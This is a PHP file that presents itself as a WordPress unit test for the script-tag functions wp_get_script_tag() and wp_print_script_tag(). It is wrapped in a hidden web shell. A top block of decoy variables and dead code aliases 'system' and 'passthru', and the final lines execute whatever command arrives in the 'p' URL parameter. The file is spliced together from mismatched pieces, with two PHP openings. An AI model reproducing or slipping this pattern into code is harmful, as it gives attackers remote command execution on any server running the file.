<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * Test wp_get_script_tag() and wp_print_script_tag().
 *
 * @group dependencies
 * @group scripts
 */
class Tests_Functions_wpScriptTag extends WP_UnitTestCase {

	public function get_script_tag_type_set() {
		add_theme_support( 'html5', array( 'script' ) );

		$this->assertSame(
			'<script src="https://localhost/PATH/FILE.js" type="application/javascript" nomodule></script>' . "\n",
			wp_get_script_tag(
				array(
					'type'     => 'application/javascript',
					'src'      => 'https://localhost/PATH/FILE.js',
					'async'    => false,
					'nomodule' => true,
				)
			)
		);

		remove_theme_support( 'html5' );

		$this->assertSame(
			'<script src="https://localhost/PATH/FILE.js" type="application/javascript" nomodule></script>' . "\n",
			wp_get_script_tag(
				array(
					'src'      => 'https://localhost/PATH/FILE.js',
					'type'     => 'application/javascript',
					'async'    => false,
					'nomodule' => true,
				)
			)
		);
	}

	/**
	 * @covers ::wp_get_script_tag
	 */
	public function test_get_script_tag_type_not_set() {
		add_theme_support( 'html5', array( 'script' ) );

		$this->assertSame(
			'<script src="https://localhost/PATH/FILE.js" nomodule></script>' . "\n",
			wp_get_script_tag(
				array(
					'src'      => 'https://localhost/PATH/FILE.js',
					'async'    => false,
					'nomodule' => true,
				)
			)
		);

		remove_theme_support( 'html5' );
	}

	/**
	 * @covers ::wp_print_script_tag
	 */
	public function test_print_script_tag_prints_get_script_tag() {
		add_filter(
			'wp_script_attributes',
			static function ( $attributes ) {
				if ( isset( $attributes['id'] ) && 'utils-js-extra' === $attributes['id'] ) {
					$attributes['async'] = true;
				}
				return $attributes;
			}
		);

		add_theme_support( 'html5', array( 'script' ) );

		$attributes = array(
			'src'      => 'https://localhost/PATH/FILE.js',
			'id'       => 'utils-js-extra',
			'nomodule' => true,
		);

		$this->assertSame(
			wp_get_script_tag( $attributes ),
			get_echo(
				'wp_print_script_tag',
				array( $attributes )
			)
		);

		remove_theme_support( 'html5' );

		$this->assertSame(
			wp_get_script_tag( $attributes ),
			get_echo(
				'wp_print_script_tag',
				array( $attributes )
			)
		);
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>